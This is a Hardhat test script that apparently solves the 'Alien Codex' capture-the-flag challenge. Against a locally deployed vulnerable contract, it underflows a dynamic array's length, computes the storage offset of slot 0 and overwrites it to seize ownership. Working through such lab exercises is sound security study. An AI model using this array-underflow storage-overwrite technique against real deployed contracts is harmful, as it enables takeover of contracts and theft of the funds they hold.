const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Alien Codex", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();
    const AlienCodexContract = await ethers.getContractFactory("AlienCodex");
    const AlienCodex = await AlienCodexContract.deploy();
    await AlienCodex.deployed();
    return {
      owner,
      otherAccount,
      AlienCodex,
    };
  }

  describe("Deployment", function () {
    it("Should Become the owner of the AlienCodex Contract", async function () {
      const { owner, otherAccount, AlienCodex } = await loadFixture(
        deployOneYearLockFixture
      );
      const Owner = await AlienCodex.owner();
      const addr = await ethers.provider.getStorageAt(AlienCodex.address, 0);
      console.log(addr);
      await AlienCodex.make_contact();
      const addr1 = await ethers.provider.getStorageAt(AlienCodex.address, 0);
      console.log(addr1);
      await AlienCodex.retract();
      const addr2 = await ethers.provider.getStorageAt(AlienCodex.address, 1);
      console.log(addr2);
      const start = ethers.BigNumber.from(
        ethers.utils.keccak256(
          `0x0000000000000000000000000000000000000000000000000000000000000001`
        )
      );

      const ownerOffset = ethers.BigNumber.from(`2`).pow(`256`).sub(start);
      console.log(ethers.utils.zeroPad(otherAccount.address, 32), "owner");
      const tx = await AlienCodex.revise(
        ownerOffset,
        ethers.utils.zeroPad(otherAccount.address, 32)
      );
      await tx.wait();
      const ownerChange = await ethers.provider.getStorageAt(
        AlienCodex.address,
        0
      );
      console.log(ownerChange, "ownerChange");
      const contact = await AlienCodex.contact();
      expect(contact).to.equal(false);
      const updatedOwner = await AlienCodex.owner();
      expect(updatedOwner).to.equal(otherAccount.address);
      expect(Owner).to.equal(owner.address);
    });
  });
});
